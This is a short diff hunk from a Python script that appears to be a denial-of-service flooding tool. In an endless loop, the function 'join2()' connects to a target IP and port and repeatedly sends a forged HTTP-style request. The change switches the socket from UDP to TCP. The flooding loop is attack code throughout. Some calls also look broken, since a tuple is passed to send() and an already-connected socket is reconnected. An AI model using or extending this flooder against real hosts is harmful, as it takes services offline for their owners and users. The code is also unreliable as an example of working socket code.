@@ -911,12 +911,12 @@ def join2():
   main_req = useragentl + acceptlol + sock1 + content + length + "\r\n"
   while True:
         try:
-           s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-           s.connect((ip,port))
+           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+           s.connect((str(ip),int(port)))
            s.send((data5,data3,data2))
            s.send((main_req))
            for i in range(th):
-               s.connect((ip,port))
+               s.connect((str(ip),int(port)))
                s.send((data5,data3,data2))
                s.send((main_req))
            xx += random.randint(0, int(th))
